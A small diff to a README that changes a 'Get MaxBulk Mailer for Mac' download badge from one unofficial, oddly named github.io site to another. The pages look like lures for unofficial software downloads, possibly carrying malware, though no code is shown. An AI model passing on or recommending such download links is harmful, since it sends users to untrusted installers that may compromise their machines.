@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![Get MaxBulk Mailer Mac](https://img.shields.io/badge/Get_MaxBulk_Mailer_for_Mac-blue?style=for-the-badge&logo=apple)](https://install-quick-software.github.io/.github/maxbulk)
+[![Get MaxBulk Mailer Mac](https://img.shields.io/badge/Get_MaxBulk_Mailer_for_Mac-blue?style=for-the-badge&logo=apple)](https://tubus-jubus-apps.github.io/.github/maxbulk)
 
 </div>
 
